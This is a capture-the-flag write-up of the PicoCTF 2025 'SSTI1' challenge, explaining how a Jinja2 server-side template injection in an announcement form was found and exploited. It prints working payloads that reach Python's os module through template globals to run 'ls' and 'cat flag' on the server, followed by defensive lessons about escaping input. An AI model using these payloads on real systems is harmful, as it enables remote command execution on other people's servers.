# CTF Writeup: SSTI1 (PicoCTF 2025)

This challenge presents a simple website where users can submit an announcement, which then gets displayed back to them. At first glance, it seems harmless, but since this is a CTF challenge called **SSTI1**, the name itself is a huge hint: *Server-Side Template Injection*.  

---

## Step 1: Inspect the Website

The page looks like this:

![Website Screenshot](./landing_page.png)  
![Form Screenshot](example_input.png)  
![Output Screenshot](example.png)  

The frontend HTML is straightforward:

```html
<!DOCTYPE html>
<html>
  <head><title>SSTI1</title></head>
  <body>
    <h1> Home </h1>
    <p>I built a cool website that lets you announce whatever you want!* </p>
    <form action="/" method="POST">
      What do you want to announce: <input name="content" id="announce"> 
      <button type="submit"> Ok </button>
    </form>
    <p style="font-size:10px;position:fixed;bottom:10px;left:10px;"> 
      *Announcements may only reach yourself 
    </p>
  </body>
</html>
```

- No extra parameters in the request.  
- No hidden scripts or suspicious endpoints.  
- Just a text input reflected back on the page.  

So the vulnerability must be in how this input is processed.

---

## Step 2: Hypotheses

When user input is echoed back, a few classic vulnerabilities come to mind:  

1. **XSS (Cross-Site Scripting)**  
   â†’ Would run malicious JavaScript in the browser, but that affects only the client side.  

2. **SQL Injection**  
   â†’ Doesnâ€™t make sense here, since we arenâ€™t interacting with a database.  

3. **SSTI (Server-Side Template Injection)**  
   â†’ Happens when user input is directly passed into a template engine (like Latex, Jinja2, Smarty, Twig, etc.) and rendered as code.  

Given the challenge title, option (3) is the clear candidate. I have done this once with Latex and forced it to execute a command. Maybe this will be similar.

---

## Step 3: Testing for Jinja2

We have to start with a framework. Jinja2 is the most common template engine for Python (I would say), so we will start with that. A common way to test for Jinja2 is to inject a simple expression:  

```
{{ 5*5 }}
```

If the output renders as `25`, the input is being evaluated inside a Jinja2 template.

**Bingo!** The expression evaluates, confirming a Jinja2 SSTI.

## Step 4: Exploring the Template Context

With SSTI confirmed, the next step is to explore whatâ€™s available in the rendering context. One useful trick is to look at the templateâ€™s global python variables:

```
{{ self.__init__.__globals__ }}
```

The app outputs something like:

```
# {'__name__': 'jinja2.runtime', '__doc__': 'The runtime functions and state used by compiled templates.', ...
'__builtins__': {...}, 'Macro': <class 'jinja2.runtime.Macro'>, ... }
```

This reveals access to Python internals â€” including `__builtins__`.  
Thatâ€™s huge, because from here, we can call dangerous functions like `__import__`.

---

## Step 5: Arbitrary Code Execution

Once we have `__import__`, itâ€™s game over. We can import Pythonâ€™s `os` module and execute system commands:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

This executes `ls` on the server and returns the directory contents.

Reading the flag is just as simple:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

ðŸ‘‰ Flag successfully retrieved.

## Step 6: Lessons Learned

This challenge demonstrates the danger of **mixing data and code**.  

- User input must never be directly passed into a template without escaping.  
- In Jinja2, the correct way to safely display user input is to **escape it**, ensuring that itâ€™s treated purely as text rather than executable code.  

---

## Final Thoughts

What started as a plain input field turned into full server compromise with just a few payloads. This is why developers must **sanitize input** and **separate logic from presentation**.  

SSTI vulnerabilities might not be as well-known as XSS or SQL injections, but theyâ€™re just as dangerous. Especially, since they are less known.
